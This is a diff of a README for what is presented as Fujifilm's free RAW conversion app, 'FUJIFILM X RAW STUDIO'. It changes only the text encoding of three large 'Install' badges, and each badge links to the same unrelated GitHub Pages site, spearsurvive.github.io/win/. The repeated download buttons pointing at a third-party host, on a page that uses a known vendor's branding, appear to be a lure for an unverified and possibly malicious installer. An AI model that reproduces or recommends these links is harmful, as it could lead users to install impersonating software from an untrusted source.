@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install FUJIFILM X RAW STUDIO](https://img.shields.io/badge/⬇_Install_FUJIFILM%20X%20RAW%20STUDIO-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install FUJIFILM X RAW STUDIO](https://img.shields.io/badge/⬇_Install_FUJIFILM+X+RAW+STUDIO-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ FUJIFILM X RAW STUDIO is a free desktop application for converting Fujifilm X-se
 
 <div align="center">
 
-[![⬇ Install FUJIFILM X RAW STUDIO](https://img.shields.io/badge/⬇_Install_FUJIFILM%20X%20RAW%20STUDIO-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install FUJIFILM X RAW STUDIO](https://img.shields.io/badge/⬇_Install_FUJIFILM+X+RAW+STUDIO-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ FUJIFILM X RAW STUDIO is a free desktop application for converting Fujifilm X-se
 
 <div align="center">
 
-[![⬇ Install FUJIFILM X RAW STUDIO](https://img.shields.io/badge/⬇_Install_FUJIFILM%20X%20RAW%20STUDIO-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install FUJIFILM X RAW STUDIO](https://img.shields.io/badge/⬇_Install_FUJIFILM+X+RAW+STUDIO-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
